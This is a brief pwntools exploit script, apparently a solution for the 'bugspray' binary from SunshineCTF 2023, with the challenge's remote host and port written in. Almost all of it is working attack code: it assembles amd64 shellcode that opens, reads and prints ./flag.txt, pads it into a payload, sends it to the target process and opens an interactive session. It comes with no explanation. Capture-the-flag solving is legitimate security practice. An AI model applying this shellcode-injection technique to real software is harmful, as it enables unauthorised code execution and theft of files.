#!/usr/bin/python

from pwn import *

exe = "./bugspray"
elf = ELF(exe)

context.binary = elf
context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-h"]

gdbscript = """
b *0x00401072
continue
"""

if args.REMOTE:
    # TODO
    p = remote("chal.2023.sunshinectf.games", 23004)
elif args.RUN:
    # TODO
    p = process([exe])
else:
    p = process([exe])
    gdb.attach(p, gdbscript=gdbscript)

sc = shellcraft.amd64.pushstr("./flag.txt")
sc += shellcraft.amd64.linux.syscall("SYS_open", "rsp")
sc += shellcraft.amd64.linux.syscall("SYS_read", "rax", "rsp", 0x50)
sc += shellcraft.amd64.linux.syscall("SYS_write", 1, "rsp", 0x50)

sc = asm(sc)

info(f"Length of shellcode: {len(sc)}")

# payload = sc + b"A" * (0x11)
payload = sc + b"A" * (0x11 + 0x10 - 22)
p.send(payload)

p.interactive()
